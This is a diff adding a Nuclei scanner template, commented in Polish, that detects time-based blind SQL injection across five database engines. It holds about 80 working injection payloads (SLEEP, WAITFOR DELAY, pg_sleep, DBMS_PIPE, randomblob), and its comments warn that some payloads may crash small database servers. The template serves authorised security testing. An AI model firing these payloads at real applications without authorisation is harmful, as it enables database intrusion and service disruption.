@@ -1,0 +1,241 @@
+# ============================================================================
+# WSTG-INPV-05: SQL Injection - Time-Based Blind (Universal)
+# Review status: ZACHOWANY
+# Reviewer: Claude Code (Opus 4.7)
+# Review date: 2026-04-30
+# Powód decyzji: szablon spełnia wszystkie 6 kryteriów review (Coverage Matrix,
+# multi-warstwowe matchery z anti-FP, source comments, safety nets,
+# sweet spot payloadów, component fuzzing). OOB matcher nie jest dodany
+# świadomie: Time-based blind SQLi - analyzer time_delay; OOB pokryte przez INPV-05-error second block.
+#
+# ============================================================================
+#
+# Coverage Matrix:
+#
+# Silniki DB:
+#   ✓ MySQL / MariaDB - SLEEP(N), BENCHMARK(N,...)
+#   ✓ PostgreSQL - pg_sleep(N)
+#   ✓ MSSQL - WAITFOR DELAY 'h:m:s'
+#   ✓ Oracle - DBMS_PIPE.RECEIVE_MESSAGE, DBMS_LOCK.SLEEP
+#   ✓ SQLite - randomblob heavy compute (no native sleep)
+#   ✗ MS Access - no native sleep, brak praktycznych payloadów
+#
+# Techniki:
+#   ✓ Standardowe sleep w escape contexts (', ", ;, --, #, /*)
+#   ✓ Conditional time delay (IF/CASE based)
+#   ✓ Stacked queries (;WAITFOR;)
+#   ✓ Nested SELECT injection
+#   ✓ Time analyzer z linear regression (zamiast prostego duration check)
+#
+# KRYTYCZNE: używamy `analyzer: time_delay` z [SLEEPTIME] placeholder zamiast
+# hardcoded duration check. To eliminuje FP od wolnych endpointów / network jitter.
+# Time analyzer wysyła kolejne 4 weryfikacyjne requesty z różnymi sleep values
+# (5s, 1s, 5s, 1s) i odrzuca payload jeśli linear regression nie pasuje.
+#
+# Performance budget: heavy (~80 payloads × 5 części × 5 weryfikacyjnych żądań/payload)
+# Estimated time: ~30-60 min na typowej aplikacji (heavy ze względu na sleep×N)
+#
+# Source hierarchy:
+#   1. dast/vulnerabilities/sqli/time-based-sqli.yaml (baza)
+#   2. PayloadsAllTheThings/SQL Injection/<engine>/Time*
+#   3. hacktricks/.../sql-injection time-based section
+# ============================================================================
+
+id: wstg-inpv-05-sqli-time-based
+
+info:
+  name: "WSTG-INPV-05: SQL Injection - Time-Based Blind (Universal)"
+  author: pentest-team
+  severity: critical
+  description: |
+    Wykrywa Blind SQL Injection przez wstrzykiwanie funkcji opóźniających
+    (SLEEP, pg_sleep, WAITFOR, DBMS_PIPE.RECEIVE_MESSAGE) w escape contexts
+    typowych dla SQL parserów. Używa Nuclei time_delay analyzer który robi
+    linear regression na 4 weryfikacyjnych requestach - eliminuje to FP od
+    wolnych endpointów. Działa przeciwko historii Burp.
+  reference:
+    - https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md
+    - https://book.hacktricks.xyz/pentesting-web/sql-injection
+  classification:
+    cwe-id: CWE-89
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 9.8
+  tags: dast,wstg,wstg-v42-inpv-05,sqli,sqli-time-based,sqli-blind,asvs-v5.3.4,asvs-v5.3.5,burp-history
+
+variables:
+  auth_token: ""
+  session_cookie: ""
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method != "OPTIONS"'
+          - 'method != "HEAD"'
+          - 'method != "DELETE"'
+          - '!regex("(?i)\\.(js|css|png|jpg|jpeg|gif|svg|ico|woff2?|ttf|otf|eot|map|pdf|zip|tar|gz|mp4|webm)(\\?|$)", path)'
+          - '!regex("(?i)/(delete|cancel|drop|destroy|remove|purge|wipe|reset|terminate)(/|$|\\?)", path)'
+        condition: and
+
+    payloads:
+      # ====================================================================
+      # Wszystkie payloady używają [SLEEPTIME] placeholder - analyzer
+      # podstawia ten symbol z różnymi wartościami (5s, 1s, 5s, 1s) podczas
+      # weryfikacji linear regression.
+      # Source: dast/sqli/time-based-sqli.yaml + PayloadsAllTheThings
+      # ====================================================================
+      injection:
+        # ====================================================================
+        # GROUP 1: MySQL / MariaDB - SLEEP() / BENCHMARK()
+        # ====================================================================
+        - "(SELECT(0)FROM(SELECT(SLEEP([SLEEPTIME])))a)"
+        - "'XOR(SELECT(0)FROM(SELECT(SLEEP([SLEEPTIME])))a)XOR'Z"
+        - "' AND (SELECT 4800 FROM (SELECT(SLEEP([SLEEPTIME])))HoBG)--"
+        - "' AND SLEEP([SLEEPTIME])--"
+        - "\" AND SLEEP([SLEEPTIME])--"
+        - "if(now()=sysdate(),SLEEP([SLEEPTIME]),0)"
+        - "'XOR(if(now()=sysdate(),SLEEP([SLEEPTIME]),0))XOR'Z"
+        - "'XOR(SELECT CASE WHEN(1234=1234) THEN SLEEP([SLEEPTIME]) ELSE 0 END)XOR'Z"
+        - "SLEEP([SLEEPTIME])#"
+        - "SLEEP([SLEEPTIME])--"
+        - "SLEEP([SLEEPTIME])='"
+        - "SLEEP([SLEEPTIME])=\""
+        - "1 OR SLEEP([SLEEPTIME])#"
+        - "1) OR SLEEP([SLEEPTIME])#"
+        - "1)) OR SLEEP([SLEEPTIME])#"
+        - "' OR SLEEP([SLEEPTIME])#"
+        - "\" OR SLEEP([SLEEPTIME])#"
+        - "') OR SLEEP([SLEEPTIME])#"
+        - "\") OR SLEEP([SLEEPTIME])#"
+        - "')) OR SLEEP([SLEEPTIME])#"
+        - "\")) OR SLEEP([SLEEPTIME])#"
+        - "' AnD SLEEP([SLEEPTIME]) ANd '1"
+        - "'&&SLEEP([SLEEPTIME])&&'1"
+        - "ORDER BY SLEEP([SLEEPTIME])--"
+        - "(SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))a)"
+        - "(SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))a)#"
+        - "(SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))a)--"
+        - "+ SLEEP([SLEEPTIME]) + '"
+        # BENCHMARK alternative (gdy SLEEP zablokowane)
+        - "1 AND BENCHMARK(2000000,MD5(NOW()))--"
+        - "' AND BENCHMARK(2000000,MD5(NOW()))--"
+
+        # ====================================================================
+        # GROUP 2: MSSQL - WAITFOR DELAY
+        # ====================================================================
+        - ";WAITFOR DELAY '0:0:[SLEEPTIME]'--"
+        - "');WAITFOR DELAY '0:0:[SLEEPTIME]'--"
+        - "');WAITFOR DELAY '0:0:[SLEEPTIME]'--"
+        - "\");WAITFOR DELAY '0:0:[SLEEPTIME]'--"
+        - "));WAITFOR DELAY '0:0:[SLEEPTIME]'--"
+        - "'));WAITFOR DELAY '0:0:[SLEEPTIME]'--"
+        - "\"));WAITFOR DELAY '0:0:[SLEEPTIME]'--"
+        - "WAITFOR DELAY '0:0:[SLEEPTIME]'"
+        - "WAITFOR DELAY '0:0:[SLEEPTIME]'--"
+        - "1 WAITFOR DELAY '0:0:[SLEEPTIME]'--"
+        - "1' WAITFOR DELAY '0:0:[SLEEPTIME]'--"
+        - "1' AND IF(1=1,WAITFOR DELAY '0:0:[SLEEPTIME]',1)--"
+
+        # ====================================================================
+        # GROUP 3: PostgreSQL - pg_sleep
+        # ====================================================================
+        - "pg_sleep([SLEEPTIME])--"
+        - "1 OR pg_sleep([SLEEPTIME])--"
+        - "\" OR pg_sleep([SLEEPTIME])--"
+        - "' OR pg_sleep([SLEEPTIME])--"
+        - "1) OR pg_sleep([SLEEPTIME])--"
+        - "\") OR pg_sleep([SLEEPTIME])--"
+        - "') OR pg_sleep([SLEEPTIME])--"
+        - "1)) OR pg_sleep([SLEEPTIME])--"
+        - "')) OR pg_sleep([SLEEPTIME])--"
+        - "; SELECT pg_sleep([SLEEPTIME])--"
+        - "1 AND (SELECT [SLEEPTIME] FROM pg_sleep([SLEEPTIME]))--"
+        - "'; SELECT pg_sleep([SLEEPTIME])--"
+        - "(SELECT pg_sleep([SLEEPTIME]))"
+
+        # ====================================================================
+        # GROUP 4: Oracle - DBMS_PIPE.RECEIVE_MESSAGE / DBMS_LOCK.SLEEP
+        # ====================================================================
+        - "1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',[SLEEPTIME])=1"
+        - "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',[SLEEPTIME])=1--"
+        - "\" AND DBMS_PIPE.RECEIVE_MESSAGE('a',[SLEEPTIME])=1--"
+        - "1 || DBMS_PIPE.RECEIVE_MESSAGE('a',[SLEEPTIME])"
+        - "'||DBMS_PIPE.RECEIVE_MESSAGE('a',[SLEEPTIME])||'"
+        - "BEGIN DBMS_LOCK.SLEEP([SLEEPTIME]); END;"
+        - "(SELECT UTL_INADDR.get_host_address('nonexistent.local') FROM dual)"
+
+        # ====================================================================
+        # GROUP 5: SQLite - heavy compute (no native sleep, ale randomblob)
+        # ====================================================================
+        - "AND 1=randomblob([SLEEPTIME]00000000)"
+        - "' AND 1=randomblob([SLEEPTIME]00000000)--"
+        - "\" AND 1=randomblob([SLEEPTIME]00000000)--"
+
+        # ====================================================================
+        # GROUP 6: Generic CASE-WHEN time injection
+        # ====================================================================
+        - "(CASE WHEN (1=1) THEN SLEEP([SLEEPTIME]) ELSE 0 END)"
+        - "' OR (CASE WHEN (1=1) THEN SLEEP([SLEEPTIME]) ELSE 0 END)--"
+        - "(CASE WHEN (USER='root') THEN SLEEP([SLEEPTIME]) ELSE 0 END)"
+
+    fuzzing:
+      - parts: [query, body, cookie, path]
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{injection}}"
+
+    # ========================================================================
+    # KLUCZOWE: time_delay analyzer zamiast prostego duration check.
+    # Linear regression na 4 verification requestach eliminuje FP od wolnych
+    # endpointów / network jitter. Domyślne parametry (5s sleep, 4 verify)
+    # są dobre.
+    # ========================================================================
+    analyzer:
+      name: time_delay
+      parameters:
+        sleep_duration: 7
+        requests_limit: 4
+        time_correlation_error_range: 0.15
+        time_slope_error_range: 0.30
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      # Warstwa 1: PRIMARY - analyzer potwierdził linear time correlation
+      - type: word
+        part: analyzer
+        name: time-delay-confirmed
+        words:
+          - "true"
+
+      # Warstwa 2: ANTI-FP - WAF block exclusion
+      - type: dsl
+        name: not-waf-block
+        dsl:
+          - 'status_code != 403 || (status_code == 403 && !contains(tolower(body), "blocked") && !contains(tolower(body), "forbidden by"))'
+
+      # Warstwa 3: ANTI-FP - CSRF rejection exclusion
+      - type: regex
+        part: body
+        name: not-csrf-rejection
+        negative: true
+        regex:
+          - "(?i)(invalid csrf token|csrf token mismatch)"
+
+    extractors:
+      - type: dsl
+        name: analyzer-details
+        dsl:
+          - "analyzer_details"
+
+# ============================================================================
+# Known limitations:
+# - Heavy budget: każdy potencjalny match generuje 4-5 dodatkowych requestów
+#   weryfikacyjnych. Dla aplikacji z 100 endpointami × 80 payloads × 5 części
+#   to może być nawet 2000+ pełnych weryfikacji.
+# - Aplikacje za rate-limiterem (429) generują FN bo regression się rozjeżdża
+# - SQLite heavy-compute payloady mogą crashować małe DB serwery
+# ============================================================================
